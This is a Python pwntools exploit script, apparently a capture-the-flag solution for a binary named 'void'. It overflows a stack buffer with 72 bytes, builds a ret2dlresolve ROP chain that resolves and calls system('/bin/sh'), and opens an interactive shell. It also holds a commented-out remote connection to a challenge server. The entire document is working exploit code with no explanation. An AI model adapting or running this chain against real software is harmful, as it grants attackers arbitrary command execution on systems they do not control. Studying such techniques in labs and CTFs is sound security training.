from pwn import *

for i in range(1, 100):
    try:
        context.arch = "amd64"
        elf = context.binary = ELF('./void', checksec=False)
        p = elf.process()

        #p = remote('104.248.169.177',31673)

        rop = ROP(elf)

        # create the dlresolve object
        dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

        #print('-'*100,i)
        rop.raw('A' * 72)
        rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
        rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

        log.info(rop.dump())

        p.sendline(rop.chain())
        p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

        p.interactive()
    except:
        p.close()

